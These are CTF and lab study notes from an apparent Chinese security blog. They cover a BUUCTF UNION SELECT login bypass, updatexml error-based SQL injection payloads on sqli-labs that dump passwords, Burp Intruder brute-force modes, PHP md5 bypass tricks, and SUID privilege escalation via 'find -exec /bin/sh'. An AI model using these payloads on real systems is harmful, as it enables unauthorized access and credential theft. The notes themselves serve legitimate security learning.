<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="built_in">select</span>%<span class="number">20</span>”admin“,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;pw=123456   </span></span><br><span class="line"><span class="comment">//把第一位，即1的位置换成用户名admin</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220910085003536.png" alt="image-20220910085003536"></p>
<p>提示用户名错误，看来用户名不在第一位</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="number">-1</span>&#x27;<span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="number">3</span>#&amp;pw<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">//把第二位，即<span class="number">2</span>的位置换成用户名admin</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220910085115686.png" alt="image-20220910085115686"></p>
<p>提示密码错误，看来用户名回显就在第二位</p>
<p><strong>但是没有回显我们select的数据，可是如果用报错注入和盲注的话，()被过滤了，也不能用</strong></p>
<p>所以我们只有考虑，怎么才可以登录上去</p>
<p>首先这是一个sql注入的题目，密码不可能简单的爆破就可以解决</p>
<p><strong>密码肯定是进行加密，最常见的密码加密就是md5</strong>，所以我们利用<code>md()</code>函数把我们的密码加密，再加上我们的用户名一起导入到题目的数据库里，即可完成登录</p>
<p>注意因为<code>()</code>被过滤，所以只能先把密码进行md5加密，在导入，而不能直接用函数</p>
<hr>
<p>这里又有一个新的知识点</p>
<p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。【union select】</strong></p>
<p>在<code>Web-study</code>里写的详细</p>
<p>下面简单说一下流程</p>
<p>先把我们的密码123456利用md5加密</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220910090640990.png" alt="image-20220910090640990"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>

<p>然后构造payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="Q"><figure class="iseeu highlight /q"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">201</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class="number">123456</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">联合注入的技巧，就是在使用<span class="built_in">union</span> <span class="keyword">select</span>时候，后面的数据如果不存在，就会生成一个虚拟的数据</span><br><span class="line">如上面的</span><br><span class="line"></span><br><span class="line">根据上面base编码结果，<span class="keyword">select</span> * <span class="keyword">from</span> user <span class="built_in">where</span> username = &#x27;$name&#x27;</span><br><span class="line"></span><br><span class="line">我们利用<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span></span><br><span class="line"></span><br><span class="line">因为user表里不存在id=<span class="number">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">所以会生成一个一个数据插入表中</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">当name参数进行sql注入，把数据插入user表中时</span><br><span class="line">后面password只要和明文一样，即可登录成功</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220910091405613.png" alt="image-20220910091405613"></p>
<p>得到flag</p>
<h2 id="13-护网杯-2018-easy-tornado"><a href="#13-护网杯-2018-easy-tornado" class="headerlink" title="13.[护网杯 2018]easy_tornado"></a>13.[护网杯 2018]easy_tornado</h2><h3 id="1-题目描述-10"><a href="#1-题目描述-10" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>线下靶场学习</title>
    <url>/2022/06/21/underline-learning/</url>
    <content><![CDATA[<p><u><code>为什么学习线下靶场，因为线下靶场相比更加容易理解漏洞入门，</code></u></p>
<p><u><code>而且可以看到网站的源码，从而可以锻炼代码审计能力，找出漏洞的成因，</code></u></p>
<p><u><code>尝试自己提出绕过或者防御的措施，这里只记录一下本人觉得的线下靶场印象深刻，对本人有意义的部分</code></u></p>
<span id="more"></span>

<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">推荐文章链接</a></p>
<p><em><u>不要只知道payload，要仔细分析理解源码，找出出现漏洞的原因点</u></em></p>
<p><u><code>建议看推荐文章，下面代码审计和题目分析仅是我个人能力结果，只能尽可能说到点处</code></u></p>
<p><u><code>而且部分也是借鉴推荐文章内容</code></u></p>
<h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>这里不全写，详细建议找一下sql-labs天书，认真学习一下</u></em></p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>其实我们可以先在源代码中看到一个函数。<code>check_input()</code>函数。 就会了解为什么不在<code>username</code>处进行注入</p>
<p><img src="/2022/06/21/underline-learning/image-20220729232132515.png" alt="image-20220729232132515"></p>
<p><img src="/2022/06/21/underline-learning/image-20220729232104117.png" alt="image-20220729232104117"></p>
<p>这里把这几个函数解释一下，就清楚了</p>
<p><strong>★addslashes()</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">addslashes<span class="comment">()</span> 函数返回在预定义字符之前添加反斜杠的字符串。 </span><br><span class="line"></span><br><span class="line">预定义字符是： </span><br><span class="line"></span><br><span class="line">​单引号（<span class="string">&#x27;） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​双引号（&quot;） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​反斜杠（\） </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​NULL </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以使用函数 get_magic_quotes_gpc() 进行检测。 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">语法：addslashes(<span class="built_in">string</span>) </span><br><span class="line"></span><br><span class="line">参数             描述</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>          必需。规定要转义的字符串。 </span><br><span class="line"></span><br><span class="line">返回值：         返回已转义的字符串。 </span><br><span class="line"></span><br><span class="line">PHP 版本：       <span class="number">4</span>+ </span><br></pre></td></tr></table></figure></div>

<p><strong>★stripslashes()</strong> </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">函数删除由 <span class="built_in">addslashes</span>() 函数添加的反斜杠。 </span><br></pre></td></tr></table></figure></div>

<p><strong>★mysql_real_escape_string()</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">函数转义 <span class="keyword">SQL</span> 语句中使用的字符串中的特殊字符。 </span><br></pre></td></tr></table></figure></div>

<p>下列字符受影响： </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\x00</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\n</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\r</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\x1a </span></span><br></pre></td></tr></table></figure></div>

<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">语法：mysql<span class="constructor">_real_escape_string(<span class="params">string</span>,<span class="params">connection</span>)</span> </span><br><span class="line"></span><br><span class="line">参数                              描述 </span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>                            必需。规定要转义的字符串。 </span><br><span class="line"></span><br><span class="line">connection 可选。    规定 MySQL 连接。如果未规定，则使用上一个连接</span><br></pre></td></tr></table></figure></div>

<p>所以注入处应该在<code>passwd</code>中</p>
<p>开始先尝试注入，发现没有回显，</p>
<p>所以试试报错注入</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from users),0x7e),1)#</code></p>
<p>报出<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code></p>
<p><img src="/2022/06/21/underline-learning/image-20220905094419111.png" alt="image-20220905094419111"></p>
<p><u>大致意思是，在同一语句中，不能先select出同一表中的某些值，再update这个表</u></p>
<p>所以这里就需要加一个中间表，就可以绕过这个错误</p>
<p>比如</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select password from (select password from users)a),0x7e),1)#</code></p>
<p>这里就是把<code>(select password from users)</code>的查询后的数据存入生成的新表a，然后就相当于<code>(select password from a)</code></p>
<p><img src="/2022/06/21/underline-learning/image-20220905094517322.png" alt="image-20220905094517322"></p>
<p>发现不能超过一行</p>
<p>于是用</p>
<p><code>1&#39;and updatexml(1,concat(0x7e,(select group_concat(password) from (select password from users)a),0x7e),1)#</code></p>
<p>成功</p>
<p><img src="/2022/06/21/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></p>
<h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>WEB学习笔记</title>
    <url>/2022/05/31/daily/</url>
    <content><![CDATA[<p><u><code>随便记一下，记录学习过程中的学习经验，欢迎指正和补充</code></u></p>
<span id="more"></span>

<h1 id="学习随记"><a href="#学习随记" class="headerlink" title="学习随记"></a>学习随记</h1><h2 id="1-网站连接重置，用清空缓存和Cookie解决："><a href="#1-网站连接重置，用清空缓存和Cookie解决：" class="headerlink" title="1.网站连接重置，用清空缓存和Cookie解决："></a>1.网站连接重置，用清空缓存和<u><strong>Cookie</strong></u>解决：</h2><p>今天在打buuctf靶场的时候遇到一个问题，就是当页面跳转时，会显示连接重置，导致我的sql注入结果不能显示，然后百度了一下，发现可能是浏览器缓存太多导致的，于是我把浏览器的缓存和cookie一同全部清空，然后我再刷新sql 注入那道题的界面，解决了，没有再显示连接重置，也显示了我的注入结果，我正要交flag的时候，然后，我发现…..，我的buuctf账号下线，我的csdn账号也下线了</p>
<p>cookie的作用和重要性就出来了，从这个事情看出，cookie是当我们登录网站的主要身份凭证，当我删除cookie后，我无法证明自己身份时，即网站当前浏览器无该账号当前在该网站的cookie时，网站就会强制下线我的账号</p>
<p>但是，如果我们在登录网站时（没有退出），点击了其他链接导致自己在该浏览器的该网站的cookie外泄，被有心人获取，那么拥有你的cookie的人，就可以登录你的账号，在你登录的网站上进行修改密码，删除文章，甚至可以转账等等</p>
<p>所以以后登录了一些重要网站时，比如支付宝，淘宝，博客网站时，别随便点击链接，保证自己的信息安全，不要黑客被黑客黑了，那确实有点难为情了</p>
<p><code>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容</code></p>
<h2 id="2-Burpsuite密码爆破初次使用"><a href="#2-Burpsuite密码爆破初次使用" class="headerlink" title="2.Burpsuite密码爆破初次使用"></a>2.Burpsuite密码爆破初次使用</h2><p>虽然不知道这个网站是那位大佬总结建立的，但还是很感谢，节省很多时间</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>之前在学习burpsuite的时候，大部分时间在用proxy和request，一直想用intruder，在做功防世界weak_auth这道题时，需要用字典爆破</p>
<p>于是我便了解了一下这个功能</p>
<p>在intruder下，主要看payload</p>
<p>payload Sets主要用Simple list和Brute forcer</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="1-Simple-list"><a href="#1-Simple-list" class="headerlink" title="1.Simple list"></a>1.Simple list</h4><p>主要就是讲写好的密码列表挨个进行测试，试出可以正确登录的密码</p>
<p><img src="/2022/05/31/daily/image-20220624165348786.png" alt="image-20220624165348786"></p>
<h4 id="2-Brute-forcer"><a href="#2-Brute-forcer" class="headerlink" title="2.Brute forcer"></a>2.Brute forcer</h4><p>就比较暴力，可以从下图看到Requset count有8,398,080次，因为他是把下面Character set里的所以字符的排列组合都试了，简单粗暴，也非常耗时间</p>
<p><img src="/2022/05/31/daily/image-20220624165405777.png" alt="image-20220624165405777"></p>
<p>这里以一次爆破为例，可以看到下方有两个<code>§ §</code>，这两处就是payload输入点，我们输入爆破数据就不断在这两处上传测试</p>
<p><img src="/2022/05/31/daily/image-20220624170325792.png" alt="image-20220624170325792"></p>
<p>如果我们已经知道了一处的数据，比如下方的username为admin，就不用用测试数据爆破，只用在password处爆破</p>
<p><img src="/2022/05/31/daily/image-20220624170753675.png" alt="image-20220624170753675"></p>
<p>那么爆破完后，如何分辨哪个才是正确密码呢</p>
<p>主要分析length，如果出现与大部分length不同的密码，那么大概率就是正确密码，比如此处， 123456就是正确密码</p>
<p><img src="/2022/05/31/daily/image-20220624170455916.png" alt="image-20220624170455916"></p>
<h4 id="3-Numbers"><a href="#3-Numbers" class="headerlink" title="3.Numbers"></a>3.Numbers</h4><p><img src="/2022/05/31/daily/image-20220626083426611.png" alt="image-20220626083426611"></p>
<p>纯数字型爆破，From是开始数字，To是结束数字，Step是间隔多少数字爆破一次</p>
<h4 id="4-Runtime-file"><a href="#4-Runtime-file" class="headerlink" title="4.Runtime file"></a>4.Runtime file</h4><p>选择自己的字典文件</p>
<h4 id="5-Custom-iterator"><a href="#5-Custom-iterator" class="headerlink" title="5.Custom iterator"></a>5.Custom iterator</h4><p>（可以自定义拼接字段，比如username:password，这样爆破的两列数据被:隔开进行爆破）</p>
<p>自定义迭代器。这种负载类型，可以配置项目的多个列表，并使用生成的列表中项的所有排列有效载荷。它提供了一个强有力的方法根据给定的模板，以产生字符或其他项目的定制排列。</p>
<h4 id="6-Character-substitution"><a href="#6-Character-substitution" class="headerlink" title="6.Character substitution"></a>6.Character substitution</h4><p>字符替换。此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。</p>
<h4 id="7-Case-modification"><a href="#7-Case-modification" class="headerlink" title="7.Case modification"></a>7.Case modification</h4><p>此负载类型允许配置一个字符串列表，并应用各种情况下修改每个项目。这可能对密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。</p>
<h4 id="8-Recursivegrep"><a href="#8-Recursivegrep" class="headerlink" title="8.Recursivegrep"></a>8.Recursivegrep</h4><p>递归grep，要用这个必须在Intruder&gt;options&gt;Grep-extract下添加一个响应匹配，比如说我一个请求页需要前一个响应页中的内容，这里就可以这样使用了。</p>
<h4 id="9-Dates"><a href="#9-Dates" class="headerlink" title="9.Dates"></a>9.Dates</h4><p>时间、日期</p>
<h4 id="10-Null-payloads"><a href="#10-Null-payloads" class="headerlink" title="10.Null payloads"></a>10.Null payloads</h4><p>这种攻击载荷产生有效载荷，其值是一个空字符串。当某种攻击请求需要反复发送同样的请求，但这种请求相对于基本请求是没有任何修改，这种攻击载荷产生有效载荷，这可用于各种攻击，例如采集 cookies来进行测序分析；应用层的拒绝服务攻击，这些请求被重复发送，导致服务器上产生高工作负荷的任务，或保活会话令牌，以便这些令牌在其它的间歇试验中使用。使用此载荷类型，它甚至没有必要在请求模板中标志有效载荷位置。您可以配置Burp产生一定特定数目的空有效载荷，或无限期地持续下去。当然我们也可以使用数字、日期等其他方式产生大量的连接，导致服务器的负载过高。</p>
<h3 id="Attack-type（爆破方式）"><a href="#Attack-type（爆破方式）" class="headerlink" title="Attack type（爆破方式）"></a>Attack type（爆破方式）</h3><p><img src="/2022/05/31/daily/image-20220710224734912.png" alt="image-20220710224734912"></p>
<h4 id="1-Sniper"><a href="#1-Sniper" class="headerlink" title="1.Sniper"></a>1.Sniper</h4><p> 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h4 id="2-Battering-ram"><a href="#2-Battering-ram" class="headerlink" title="2.Battering ram"></a>2.Battering ram</h4><p> 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。</p>
<h4 id="3-Pitchfork"><a href="#3-Pitchfork" class="headerlink" title="3.Pitchfork"></a>3.Pitchfork</h4><p>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量。</p>
<h4 id="4-Cluster-bomb"><a href="#4-Cluster-bomb" class="headerlink" title="4.Cluster bomb"></a>4.Cluster bomb</h4><p>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。（即可以在用户名和密码两处用两个字典爆破）</p>
<h2 id="3-git命令"><a href="#3-git命令" class="headerlink" title="3.git命令"></a>3.git命令</h2><p>使用githack，记录一些命令</p>
<p><img src="/2022/05/31/daily/image-20220729114811362.png" alt="image-20220729114811362"></p>
<h2 id="4-函数记录"><a href="#4-函数记录" class="headerlink" title="4.函数记录"></a>4.函数记录</h2><h3 id="1-php函数md5"><a href="#1-php函数md5" class="headerlink" title="1)php函数md5"></a>1)php函数md5</h3><p>做题时，了解到了一个新的函数<code>md5</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">php md5函数介绍为：</span><br><span class="line"></span><br><span class="line">md5( string , raw )</span><br><span class="line"></span><br><span class="line">string : 规定需要计算的字符串</span><br><span class="line"></span><br><span class="line">raw : 规定十六进制或二进制输出格式。</span><br><span class="line"></span><br><span class="line">        <span class="literal">true</span>：<span class="number">16</span>字符二进制格式</span><br><span class="line"></span><br><span class="line">        <span class="literal">false</span>(默认): <span class="number">32</span>字符十六进制数</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>比较常用的</p>
<p>数字型：<code>129581926211651571912466741651878684928</code></p>
<p><img src="/2022/05/31/daily/image-20220811135742130.png" alt="image-20220811135742130"></p>
<p>字符型：<code>ffifdyop</code></p>
<p><img src="/2022/05/31/daily/image-20220811135813137.png" alt="image-20220811135813137"></p>
<p>发现都有’or’的形式，可以构造必真的结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">MD5函数有一个漏洞，当输入的为数组时，会返回为NULL</span><br><span class="line"></span><br><span class="line">所以当遇到md5(p1)===md5(p2)，把p1和p2进行强比较时，又要求p1和p2不相等</span><br><span class="line"></span><br><span class="line">由于两个不同的字符MD5值很难一致，于是输入p1[]和p2[]两个名字一致的字符，随便赋值，</span><br><span class="line">p1[]=1&amp;p2[]=2</span><br><span class="line">返回为空，使得强比较成立</span><br><span class="line"></span><br><span class="line">**</span><br><span class="line">为什么会这样呢</span><br><span class="line">我想起之前的遇到一个题，也有数组，问了一下大佬</span><br><span class="line"></span><br><span class="line">大佬说，因为没有对数组中的元素数量声明，函数不知道数组元素第几个的值是1（或2）</span><br><span class="line">导致函数到处扫，最后返回NULL【因为这个元素位置我们根本就没定】</span><br><span class="line"></span><br><span class="line">下面举几个例子，以我个人理解</span><br><span class="line">如果是</span><br><span class="line">p1[0]=1&amp;p2[0]=2</span><br><span class="line">是可以的，因为只定义了0号位的数据，而且不相等，其他位置数据没定义，所以比较也不可能出现相等</span><br><span class="line"></span><br><span class="line">p1[0]=1&amp;p2[1]=1</span><br><span class="line">是可以的，因为这里p1[]定义了0号位为1，而p2定义的是1号位为1，比较是按顺序比较的，两个数值虽然一样，但是位置不一样，所以比较还是不相等</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">下列的字符串的MD5值都是<span class="number">0</span>e开头的：</span><br><span class="line"></span><br><span class="line"> QNKCDZO</span><br><span class="line"> <span class="number">240610708</span></span><br><span class="line"> s878926199a</span><br><span class="line"> s155964671a</span><br><span class="line"> s214587387a</span><br><span class="line"> s214587387a</span><br></pre></td></tr></table></figure></div>

<h2 id="5-特殊权限位"><a href="#5-特殊权限位" class="headerlink" title="5.特殊权限位"></a>5.特殊权限位</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxMjcxMjkyOA==&mid=2247484922&idx=1&sn=ba666d73dc1ed57385eda7210afca433&chksm=9baceb75acdb62634d94269e2052f2856bcebac7e1b0962f30132cbda7494813ae6ad2c0f88c&mpshare=1&scene=23&srcid=0830y3hzCRRlcsleoKEyGZr8&sharer_sharetime=1661831991788&sharer_shareid=30776e1834041fdca5e0b68533a2427e#rd">参考文章</a></p>
<h3 id="1）利用SUID提权"><a href="#1）利用SUID提权" class="headerlink" title="1）利用SUID提权"></a>1）利用SUID提权</h3><h4 id="什么是suid？"><a href="#什么是suid？" class="headerlink" title="什么是suid？"></a>什么是suid？</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">Set <span class="keyword">User</span>   <span class="title">ID</span>的一种权限类型，允许用户使用指定的用户权限执行文件。那些具用suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，并且我们发现二进制文件启用了suid位，那么</span><br><span class="line">这些文件/程序/命令可以以root权限运行</span><br><span class="line"></span><br><span class="line">SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限的资源</span><br></pre></td></tr></table></figure></div>

<h4 id="什么是SGID"><a href="#什么是SGID" class="headerlink" title="什么是SGID"></a>什么是SGID</h4><p>G的意思就是group，功能和suid基本不相同，唯一区别就是suid获得命令所属用户的身份和权限，而sgid是获取所属用户组的身份和权限</p>
<h4 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，SUID权限只能设置二进制文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>，命令执行者要有二进制文件的执行权。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>，命令执行者执行二进制文件时会获得该程序的属主身份。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>，SUID权限只在程序执行过程中有效。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">即如<span class="built_in">果root</span>给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，<span class="built_in">是root</span>权限。</span><br></pre></td></tr></table></figure></div>



<hr>
<h4 id="关键"><a href="#关键" class="headerlink" title="*关键"></a>*关键</h4><p>1.查看具有root用户权限的SUID二进制可执行文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">命令来查找拥有SUID权限的程序。</span><br><span class="line"></span><br><span class="line">perm指定权限，<span class="attribute">-u</span>=s代表SUID权限，type指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure></div>

<p>2.已知的可用来提权的linux可执行的文件列表如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOS"><figure class="iseeu highlight /dos"><table><tr><td class="code"><pre><span class="line">Nmap、Vim、<span class="built_in">find</span>、Bash、<span class="built_in">More</span>、Less、Nano、cp</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="（1）利用find获取root权限shell"><a href="#（1）利用find获取root权限shell" class="headerlink" title="（1）利用find获取root权限shell"></a>（1）利用find获取root权限shell</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -name cron.php -exec “/</span>bin/sh” \;</span><br><span class="line"></span><br><span class="line">这个文件名，只要存在就行，目的是让<span class="keyword">find</span>命令可以成功执行，后面的-exec就是加上命令</span><br><span class="line"></span><br><span class="line">这里<span class="keyword">find</span>有suid权限，普通用户执行时，会变成root用户，执行<span class="regexp">/bin/</span>sh命令时，会进入root用户，从而实现提权</span><br><span class="line"></span><br><span class="line">如果<span class="keyword">find</span>没有suid权限，执行<span class="regexp">/bin/</span>sh命令后，仍然是普通用户</span><br><span class="line"></span><br><span class="line">·/为根目录</span><br><span class="line">·-name 按文件名查找</span><br><span class="line">·-exec 对匹配对象执行的命令，以;结束</span><br><span class="line">但是（;）是特殊字符，需要用（\）转义</span><br></pre></td></tr></table></figure></div>

<h5 id="（2）利用cp获取root权限shell"><a href="#（2）利用cp获取root权限shell" class="headerlink" title="（2）利用cp获取root权限shell"></a>（2）利用cp获取root权限shell</h5><p>以cp为例，这里给cp添加SUID权限做测试，拥有SUID权限的程序会有rwx变成rws。</p>
<p><img src="/2022/05/31/daily/image-20220830133409844.png" alt="image-20220830133409844"></p>
<p>可以通过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure></div>

<p>命令来查找拥有SUID权限的程序。</p>
<p><img src="/2022/05/31/daily/image-20220830133446426.png" alt="image-20220830133446426"></p>
<p>当普通用户运行cp命令时，此时的cp权限就为root，利用时，可以cp把/etc/passwd复制到桌面，然后进行修改。</p>
